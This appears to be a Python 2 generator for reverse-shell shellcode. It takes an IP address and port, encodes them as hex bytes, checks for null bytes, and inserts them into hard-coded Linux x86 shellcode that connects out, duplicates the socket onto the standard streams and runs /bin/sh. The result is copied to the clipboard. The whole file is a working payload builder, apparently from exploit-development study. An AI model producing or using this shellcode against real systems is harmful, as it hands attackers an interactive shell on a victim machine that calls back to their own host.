#!/usr/bin/python  

import sys  
import socket
import binascii
import pyperclip

# usage

if len(sys.argv) != 3:
	print '[!] Please enter a IP address and port number[!]'	
	print '[*] Usage: {0} <ip-address> <port>'.format(sys.argv[0])
	exit()

ip = sys.argv[1]

port = int(sys.argv[2])

# port validation

if port > 65535:
	print '[!] Enter valid port number [!]'
	exit()

# port to hex

net_order = socket.htons(port)

hport = hex(net_order)

byte_1 = hport[2:4]
byte_2 = hport[4:6]

if byte_1 == "00":
	print '[!] Port contains null [!]'
	exit()

if byte_2 == "00":
	print '[!] Port contains null [!]'
	exit()

# add zero if byte is less than 2

if len(byte_1) < 2:
	byte_1 = "0" + byte_1
if len(byte_2) < 2:
	byte_2 = "0" + byte_2


new_port = '\\x' + byte_2 + '\\x' + byte_1

# ip to hex

hex_ip = binascii.hexlify(socket.inet_aton(ip))

octet_1 = hex_ip[0:2]
octet_2 = hex_ip[2:4]
octet_3 = hex_ip[4:6]
octet_4 = hex_ip[6:8]

new_ip = '\\x' + octet_1 + '\\x' + octet_2 + '\\x' + octet_3 + '\\x' + octet_4

big_line = '------------------------------------------'


print '[*] Input IP: ' + str(ip)
print '[*] Input Port: ' + str(port)
print big_line
print '[*] IP in hex: ' + str(hex_ip)
print '[*] Hex Port in Network Order: ' + str(hport)
print big_line
print '[*] New IP: ' + str(new_ip)
print '[*] New Hex Port: ' + str(new_port)
print big_line

# Original IP \\x7f\\x01\\x01\\x01

shellcode = "\\x31\\xc0\\x31\\xdb\\xb0\\x66\\xb3\\x01\\x31\\xd2\\x52\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x96\\xb0\\x66\\x43\\x68" + new_ip + "\\x66\\x68" + new_port + "\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\x43\\xcd\\x80\\x87\\xde\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\\x0b\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xd1\\xcd\\x80"

print '[*] New Shellcode: \n' + shellcode

print '[*] Copying Shellcode to clipboard ...'

pyperclip.copy(shellcode)

print '[*] Done!'
